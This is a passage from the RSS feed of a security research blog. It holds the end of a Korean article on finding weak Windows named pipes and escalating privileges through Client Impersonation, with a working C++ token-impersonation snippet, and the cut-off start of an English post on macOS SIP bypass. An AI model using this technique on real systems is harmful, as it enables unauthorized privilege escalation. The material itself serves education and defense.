&#xC774;&#xB984;&#xC758; Named Pipe &#xD578;&#xB4E4;&#xC744; &#xAC00;&#xC9C4; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; &#xC774;&#xC0C1;&#xD55C; &#xC810;&#xC740; <code>\\.\pipe\ogu123</code> &#xACBD;&#xB85C;&#xC5D0; Pipe&#xB97C; &#xC0DD;&#xC131;&#xD588;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C;&#xB85C;&#xB294;<code>\Device\NamedPipe\ogu123</code>&#xC5D0; Pipe&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/12/ogu123/NamedPipe/KR/11.png" alt></p><p>&#xC774;&#xB294; WinObj&#xB85C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; <code>\\.\pipe</code>&#xAC00; <code>\Device\NamedPipe</code>&#xACBD;&#xB85C;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xAC00; &#xAC78;&#xB824;&#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>\Device\NamedPipe\ogu123</code> Pipe&#xAC00; &#xC0DD;&#xC131;&#xB41C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Named-pipe-&#xCDE8;&#xC57D;&#xC810;-&#xCC3E;&#xC544;&#xBCF4;&#xAE30;"><a href="#Named-pipe-&#xCDE8;&#xC57D;&#xC810;-&#xCC3E;&#xC544;&#xBCF4;&#xAE30;" class="headerlink" title="Named pipe &#xCDE8;&#xC57D;&#xC810; &#xCC3E;&#xC544;&#xBCF4;&#xAE30;"></a>Named pipe &#xCDE8;&#xC57D;&#xC810; &#xCC3E;&#xC544;&#xBCF4;&#xAE30;</h2><p>&#xC774;&#xC81C; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; Named Pipe&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xACFC;&#xC815;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xCCAB; &#xBC88;&#xC9F8;&#xB85C; Process Explorer, accesschk, IDA &#xB4F1;&#xC744; &#xD1B5;&#xD574; &#xCC3E;&#xC544;&#xBCF4;&#xACE0; &#xB450; &#xBC88;&#xC9F8;&#xB294; Client Impersonation &#xAE30;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xCCAB; &#xBC88;&#xC9F8; &#xC2E4;&#xC2B5;&#xC740; <a href="https://github.com/VerSprite/research/tree/master/projects/cpp/VulnerableApps/WindowsPipes">&#xB9C1;&#xD06C;</a>&#xC5D0; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC0B4;&#xC9DD; &#xC218;&#xC815;&#xD574;&#xC11C; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/12/ogu123/NamedPipe/KR/12.png" alt></p><p>&#xBA3C;&#xC800; Process Explorer&#xC5D0;&#xC11C; &#xD578;&#xB4E4; &#xC635;&#xC158;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD55C; &#xB2E4;&#xC74C;, &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xD0C0;&#xAC9F; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xD578;&#xB4E4; &#xAC12;&#xC744; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/12/ogu123/NamedPipe/KR/13.png" alt></p><p>&#xD0C0;&#xAC9F; &#xD504;&#xB85C;&#xC138;&#xC2A4;(NamedPipeServer.exe)&#xAC00; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xACE0; &#xC788;&#xACE0; ogu123 Pipe&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/12/ogu123/NamedPipe/KR/14.png" alt></p><p>&#xC774;&#xC81C; accesschk&#xC758; <code>accesschk.exe \pipe\</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; \.\pipe\ &#xC544;&#xB798;&#xC758; &#xBAA8;&#xB4E0; Named Pipe&#xC758; DACL&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xADF8;&#xB9BC;&#xC5D0;&#xC11C; ogu123 Pipe&#xB294; Everyone &#xADF8;&#xB8F9;&#xC774; RW &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xD0C0;&#xAC9F; &#xD504;&#xB85C;&#xC138;&#xC2A4; Named Pipe&#xC5D0; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC5F0;&#xACB0;&#xD558;&#xACE0; Read/write&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/12/ogu123/NamedPipe/KR/15.png" alt></p><p>&#xC774;&#xC81C; IDA&#xB97C; &#xD1B5;&#xD574; &#xC11C;&#xBC84; &#xCE21; Named Pipe &#xC0DD;&#xC131; &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xACE0; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xD1B5;&#xC2E0;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; LPE&#xB97C; &#xD2B8;&#xB9AC;&#xAC70; &#xD560;&#xB9CC;&#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xCC3E;&#xC73C;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; &#xC11C;&#xBC84; &#xCE21; Named Pipe &#xC0DD;&#xC131; &#xBD80;&#xBD84;&#xC740; &#xC704; &#xADF8;&#xB9BC; &#xD568;&#xC218;&#xB4E4;(<code>CreateNamedPipeW()</code>&#xD3EC;&#xD568;)&#xC744; IDA Imports&#xB098; &#xBB38;&#xC790;&#xC5F4; &#xAC80;&#xC0C9;&#xC73C;&#xB85C; &#xCC3E;&#xC73C;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/05/12/ogu123/NamedPipe/KR/16.png" alt></p><p>&#xD0C0;&#xAC9F; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; <code>CreateNamedPipeW</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xACE0; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACF3;&#xC744; &#xB530;&#xB77C;&#xAC00;&#xBA74;</p><p><img src="/2025/05/12/ogu123/NamedPipe/KR/17.png" alt></p><p>ogu123 Pipe&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xACF3;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; Pipe &#xC0DD;&#xC131; &#xD6C4; &#xC11C;&#xBC84; &#xCE21;&#xC5D0;&#xC11C; &#xC5F0;&#xACB0;&#xB41C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; read &#xD558;&#xACE0; LPE &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560;&#xB9CC;&#xD55C; &#xBCA1;&#xD130;&#xB97C; &#xCC3E;&#xC73C;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;! &#xAC04;&#xB2E8;&#xD558;&#xC8E0;? &#x314E;&#x314E;</p><h3 id="Client-Impersonation-&#xAE30;&#xBC95;"><a href="#Client-Impersonation-&#xAE30;&#xBC95;" class="headerlink" title="Client Impersonation &#xAE30;&#xBC95;"></a>Client Impersonation &#xAE30;&#xBC95;</h3><p>Client Impersonation &#xAE30;&#xBC95;&#xC740; &#xC11C;&#xBC84;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xC5F0;&#xACB0;&#xC774; &#xB418;&#xBA74; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC5B4; LPE&#xB97C; &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xC6B0;&#xC120; &#xC11C;&#xBC84;&#xAC00; Impersonation&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC5B4;&#xC57C; &#xD558;&#xB294;&#xB370; &#xC774;&#xB294; Access Token&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; Access Token&#xC5D0; &#x201C;<strong>&#xC11C;&#xBC84;&#xAC00; &#xB0B4; &#xC815;&#xBCF4;&#xB97C; &#xC5B4;&#xB514;&#xAE4C;&#xC9C0; &#xC4F8; &#xC218; &#xC788;&#xB294;&#xC9C0;</strong>&#x201D; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC57C; &#xD558;&#xB294;&#xB370; &#xC774;&#xB97C; &#xC704;&#xD574; Impersonation Level&#xC774; &#xB4F1;&#xC7A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th>Impersonation Level</th><th>&#xC124;&#xBA85;</th></tr></thead><tbody><tr><td><code>SecurityAnonymous</code></td><td>&#xC11C;&#xBC84;&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xC2E0;&#xC6D0;&#xC744; &#xC54C; &#xC218;&#xB3C4;, Impersonation &#xD560; &#xC218;&#xB3C4; &#xC5C6;&#xC74C;</td></tr><tr><td><code>SecurityIdentification</code></td><td>&#xC11C;&#xBC84;&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xC2E0;&#xC6D0;&#xACFC; &#xAD8C;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218;&#xB9CC; &#xC788;&#xACE0;, Impersonation&#xC740; &#xBABB; &#xD568;</td></tr><tr><td><code>SecurityImpersonation</code></td><td>&#xC11C;&#xBC84;&#xB294; &#xB85C;&#xCEEC; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; Impersonation &#xD560; &#xC218; &#xC788;&#xC74C;</td></tr><tr><td><code>SecurityDelegation</code></td><td>&#xC11C;&#xBC84;&#xB294; &#xC6D0;&#xACA9; &#xC2DC;&#xC2A4;&#xD15C;&#xAE4C;&#xC9C0; &#xD3EC;&#xD568;&#xD574; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xCC98;&#xB7FC; Impersonation &#xD560; &#xC218; &#xC788;&#xC74C;</td></tr></tbody></table></div><p>Access Token&#xC740; Primary Token&#xC640; Impersonation Token &#xB450; &#xAC00;&#xC9C0;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB370; &#xC774;&#xB97C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC640; &#xC2A4;&#xB808;&#xB4DC;&#xB85C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>Windows&#xC5D0;&#xC11C; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; Access Token&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xACE0; &#xC774;&#xB54C;, &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC740; Primary Token&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC885;&#xB8CC;&#xB420; &#xB54C;&#xAE4C;&#xC9C0; &#xBCC0;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC2A4;&#xB808;&#xB4DC;&#xB294; Primary Token&#xC640; Impersonation Token &#xB450; &#xAC00;&#xC9C0; &#xAC12;&#xC744; &#xAC00;&#xC9C8; &#xC218; &#xC788;&#xACE0;, Primary Token&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; Primary Token &#xAC12;&#xC744; &#xACF5;&#xC720;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC2A4;&#xB808;&#xB4DC;&#xB294; &#xC0DD;&#xC131;&#xB420; &#xB2F9;&#xC2DC;&#xC5D0; Primary Token &#xB300;&#xC2E0; &#xB2E4;&#xB978; &#xACC4;&#xC815;&#xC758; Access Token&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370; &#xC774;&#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD1A0;&#xD070;&#xC774; Impersonation Token&#xC785;&#xB2C8;&#xB2E4;! &#xC989; &#xC2A4;&#xB808;&#xB4DC;&#xB294; Primary Token&#xC744; &#xD56D;&#xC0C1; &#xCC38;&#xC870;&#xD558;&#xACE0; Impersonation &#xC911;&#xC77C; &#xB54C;&#xB9CC; Impersonation Token &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">CreateFile(    <span class="hljs-string">L&quot;&#xB85C;&#xCEEC; Pipe &#xACBD;&#xB85C; or &#xC6D0;&#xACA9; Pipe &#xACBD;&#xB85C;&quot;</span>,    GENERIC_READ | GENERIC_WRITE,    <span class="hljs-number">0</span>,    <span class="hljs-literal">NULL</span>,    OPEN_EXISTING,    SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION, <span class="hljs-comment">// &#xB610;&#xB294; SECURITY_DELEGATION</span>    <span class="hljs-literal">NULL</span>);</code></pre><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; Client Impersonation&#xC73C;&#xB85C; LPE &#xBC29;&#xBC95;&#xC744; &#xC790;&#xC138;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xD0C0;&#xAC9F; &#xC11C;&#xBE44;&#xC2A4;&#xB098; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; <code>CreateFile()</code>&#xB97C; &#xD560; &#xB54C;, &#xC77C;&#xBC18; &#xD30C;&#xC77C; &#xACBD;&#xB85C; &#xB300;&#xC2E0;&#xC5D0; &#xACF5;&#xACA9;&#xC790; Named Pipe&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;! &#xC774;&#xB54C; <code>CreateFile()</code> &#xD568;&#xC218; 6&#xBC88;&#xC9F8; &#xC778;&#xC790; &#xAC12;&#xC774; &#xC704;&#xC640; &#xAC19;&#xC774; SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION or SECURITY_DELEGATION &#xAC12;&#xC744; &#xAC00;&#xC838;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC6D0;&#xACA9; Pipe&#xC758; &#xACBD;&#xC6B0; SECURITY_SQOS_PRESENT &#xAC12;&#xB9CC; &#xC788;&#xC744; &#xACBD;&#xC6B0;&#xC5D0;&#xB3C4; SECURITY_IMPERSONATION&#xC774; &#xC801;&#xC6A9;&#xB41C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">// Create a server named pipe</span>serverPipe = CreateNamedPipe(    pipeName,           <span class="hljs-comment">// name of our pipe, must be in the form of \\.\pipe\&lt;NAME&gt;</span>    PIPE_ACCESS_DUPLEX, <span class="hljs-comment">// The rest of the parameters don&apos;t really matter</span>    PIPE_TYPE_MESSAGE,<span class="hljs-comment">// as all you want is impersonate the client...</span>    <span class="hljs-number">1</span>,<span class="hljs-comment">// </span>    <span class="hljs-number">2048</span>,<span class="hljs-comment">// </span>    <span class="hljs-number">2048</span>,<span class="hljs-comment">// </span>    <span class="hljs-number">0</span>,<span class="hljs-comment">// </span>    <span class="hljs-literal">NULL</span><span class="hljs-comment">// This should ne NULL so every client can connect</span>);<span class="hljs-comment">// wait for pipe connections</span>BOOL bPipeConnected = ConnectNamedPipe(serverPipe, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">// Impersonate client</span>BOOL bImpersonated = ImpersonateNamedPipeClient(serverPipe);<span class="hljs-comment">// if successful open Thread token - your current thread token is now the client&apos;s token</span>BOOL bSuccess = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;hToken);<span class="hljs-comment">// now you got the client token saved in hToken and you can safeyl revert back to self</span>bSuccess = RevertToSelf();<span class="hljs-comment">// Now duplicate the client&apos;s token to get a Primary token</span>bSuccess = DuplicateTokenEx(hToken,    TOKEN_ALL_ACCESS,    <span class="hljs-literal">NULL</span>,    SecurityImpersonation,    TokenPrimary,    &amp;hDuppedToken);<span class="hljs-comment">// If that succeeds you got a Primary token as hDuppedToken and you can create a proccess with that token</span>CreateProcessWithTokenW(hDuppedToken, LOGON_WITH_PROFILE, command, <span class="hljs-literal">NULL</span>, CREATE_NEW_CONSOLE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);</code></pre><p>&#xD0C0;&#xAC9F; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xACF5;&#xACA9;&#xC790; Named Pipe &#xC11C;&#xBC84;&#xAC00; &#xC5F0;&#xACB0;&#xB418;&#xBA74; &#xC11C;&#xBC84;&#xB294; &#xC704; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; LPE&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC8FC;&#xC694;&#xD55C; &#xD568;&#xC218;&#xB4E4;&#xB9CC; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><code>ImpersonateNamedPipeClient()</code> : &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; Impersonation Token&#xC744; &#xD1B5;&#xD574; &#xC11C;&#xBC84; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0; &#xC801;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, &#xC0AC;&#xC6A9;&#xD55C; Impersonation Token&#xC740; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; Primary Token&#xC744; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0; &#xC801;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD1A0;&#xD070;&#xC785;&#xB2C8;&#xB2E4;.</li><li><code>RevertToSelf()</code> : Impersonation&#xC744; &#xC885;&#xB8CC;&#xD569;&#xB2C8;&#xB2E4;. <code>CreateProcessWithTokenW()</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC804;&#xC5D0;  &#xC774;&#xB904;&#xC838;&#xC57C; &#xC5D0;&#xB7EC;&#xAC00; &#xBC1C;&#xC0DD; &#xC548; &#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</li><li><code>DuplicateTokenEx()</code> : &#xC55E;&#xC11C; &#xC5BB;&#xC740; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; Impersonation Token&#xC744; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD55C; Primary Token&#xC73C;&#xB85C; &#xBCF5;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>CreateProcessWithTokenW()</code> : Primary Token &#xD1A0;&#xD070;&#xC744; &#xD1B5;&#xD574; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#x2192; LPE &#xBC1C;&#xC0DD;!</li></ul><h2 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h2><p>&#xC774;&#xBC88; &#xAE00;&#xC744; &#xD1B5;&#xD574; Windows IPC&#xC640; Named Pipe&#xC5D0; &#xB300;&#xD574; &#xAE4A;&#xAC8C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;! &#xAE00;&#xC744; &#xC791;&#xC131;&#xD558;&#xBA74;&#xC11C; Windows Attack Vector&#xB294; &#xC9C4;&#xC9DC; &#xB9CE;&#xAD6C;&#xB098;&#xB97C; &#xB2E4;&#xC2DC; &#xD55C;&#xBC88; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;..</p><p>&#xAE34; &#xAE00; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2F9; &#x314E;&#x314E;</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a><strong>Reference</strong></h2><ul><li>&#xC708;&#xB3C4;&#xC6B0; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D;</li><li>&#xB1CC;&#xB97C; &#xC790;&#xADF9;&#xD558;&#xB294; &#xC708;&#xB3C4;&#xC6B0;&#xC988; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D;</li><li><a href="https://www.baeldung.com/cs/pipes-vs-sockets">https://www.baeldung.com/cs/pipes-vs-sockets</a></li><li><a href="https://www.codeproject.com/Articles/13724/Windows-IPC">https://www.codeproject.com/Articles/13724/Windows-IPC</a></li><li><a href="https://versprite.com/vs-labs/microsoft-windows-pipes-intro/">https://versprite.com/vs-labs/microsoft-windows-pipes-intro/</a></li><li><a href="https://versprite.com/vs-labs/vulnerable-named-pipe-application/">https://versprite.com/vs-labs/vulnerable-named-pipe-application/</a></li><li><a href="https://csandker.io/2021/01/10/Offensive-Windows-IPC-1-NamedPipes.html">https://csandker.io/2021/01/10/Offensive-Windows-IPC-1-NamedPipes.html</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/IPC/">IPC</category>
      
      <category domain="https://hackyboiz.github.io/tags/Named-Pipe/">Named Pipe</category>
      
      <category domain="https://hackyboiz.github.io/tags/Anonymous-Pipe/">Anonymous Pipe</category>
      
      <category domain="https://hackyboiz.github.io/tags/Client-Impersonation/">Client Impersonation</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/12/ogu123/NamedPipe/KR/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] macOS: Part1 - SIP Bypass (en)</title>
      <link>https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/</link>
      <guid>https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/</guid>
      <pubDate>Sun, 11 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/&quot;&gt;macOS: Part0 - TCC Bypass&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;macOS: Part1 - SIP Bypa</description>
        
      
      
      
      <content:encoded><![CDATA[<p><a href="https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/">macOS: Part0 - TCC Bypass</a></p><p>macOS: Part1 - SIP Bypass &#x2190; Now!</p><p>Hello, I&#x2019;m clalxk! After covering TCC Bypass, I&#x2019;ve summarized SIP Bypass. Moving forward, I plan to study vulnerabilities that mainly occur on macOS, so stay tuned for Part 2!</p><p>In this post, I&#x2019;ll introduce the concept of SIP and explain the overall flow of a vulnerability through a SIP Bypass example. I&#x2019;ll also explain what Entitlement is and the role it plays in this process, among other things.</p><h2 id="System-Integrity-Protection-SIP"><a href="#System-Integrity-Protection-SIP" class="headerlink" title="System Integrity Protection (SIP)"></a><strong>System Integrity Protection (SIP)</strong></h2><p>SIP is a core security feature of macOS that prevents even root users from modifying or deleting critical system files. It protects the system by using Apple&#x2019;s sandboxing technology, securing the entire platform from root access (conceptually similar to how SELinux protects the system).</p><p>By exploiting this vulnerability, an attacker can bypass SIP, access system-protected directories, and perform various malicious actions, such as installing rootkits, bypassing TCC, and creating persistent malware. SIP-enabled systems are sometimes referred to as <strong>rootless</strong> because even if an attacker gains root privileges, these privileges are limited, and system files and directories cannot be modified.</p><h3 id="Relationship-Between-SIP-and-Entitlements"><a href="#Relationship-Between-SIP-and-Entitlements" class="headerlink" title="Relationship Between SIP and Entitlements"></a><strong>Relationship Between SIP and Entitlements</strong></h3><p>SIP protects the following paths:</p><ul><li>/System, /bin, /sbin, and /usr (with some exceptions)</li><li>The system kernel and core frameworks</li><li>Files that contain attributes set by SIP</li></ul><p><em>To fully disable SIP, settings must be changed from Recovery Mode&#x2014;this is not possible in a normal runtime environment.</em></p><p>However, because processes like system updates require access to SIP-protected directories, Apple introduced specific permissions that are exempt from SIP restrictions. </p><p>These are:</p><ul><li>com.apple.rootless.install: Allows bypassing SIP filesystem checks</li><li>com.apple.rootless.install.heritable: Inherits com.apple.rootless.install in child processes</li></ul><p>Granting specific permissions to files or processes is called assigning an &#x201C;<a href="https://developer.apple.com/documentation/bundleresources/entitlements"><strong>Entitlement</strong></a>.&#x201D;<br>Entitlements cannot be legally forged, as they are embedded during the app signing process. Apple extensively uses entitlements in macOS to enhance system security by granting internal privileges to highly specific processes.</p><p>In particular, the com.apple.rootless.install.heritable entitlement allows not only the designated process but also its child processes to inherit com.apple.rootless.install, thereby bypassing SIP filesystem protections.</p><p>We&#x2019;ll look at an example of how this entitlement was bypassed shortly!</p><h3 id="Where-SIP-Settings-Are-Stored"><a href="#Where-SIP-Settings-Are-Stored" class="headerlink" title="Where SIP Settings Are Stored"></a>Where SIP Settings Are Stored</h3><p>SIP&#x2019;s activation status and detailed permissions are stored as <strong>bitflags</strong>.</p><ul><li>On Intel Macs, these settings are saved in the csr-active-config variable in NVRAM.</li><li>On Apple Silicon (ARM) Macs, they are configured by reading the lp-sip0 value from the Device Tree during boot.</li></ul><p>In other words, the method of accessing SIP settings varies depending on the platform.</p><p>These bitflags are defined in the <strong>csr.h</strong> header file in the <strong>XNU kernel source code</strong>.</p><blockquote><p><em>XNU is the kernel for macOS and iOS, and is an open-source&#x2013;based operating system kernel developed by Apple.</em></p></blockquote><h3 id="List-of-SIP-Bitflags"><a href="#List-of-SIP-Bitflags" class="headerlink" title="List of SIP Bitflags"></a>List of SIP Bitflags</h3><p>The table below shows the major flags used to control specific SIP functionalities, as defined in the XNU source code.</p><div class="table-container"><table><thead><tr><th><strong>Bit Name (in XNU code)</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>CSR_ALLOW_UNTRUSTED_KEXTS</code></td><td>Allows loading of unsigned kernel extensions (KEXTs)</td></tr><tr><td><code>CSR_ALLOW_UNRESTRICTED_FS</code></td><td>Grants unrestricted access to protected filesystem paths</td></tr><tr><td><code>CSR_ALLOW_TASK_FOR_PID</code></td><td>Allows access to task ports for specific PIDs (used for debugging)</td></tr><tr><td><code>CSR_ALLOW_KERNEL_DEBUGGER</code></td><td>Enables kernel debugging</td></tr><tr><td><code>CSR_ALLOW_UNRESTRICTED_DTRACE</code></td><td>Allows unrestricted use 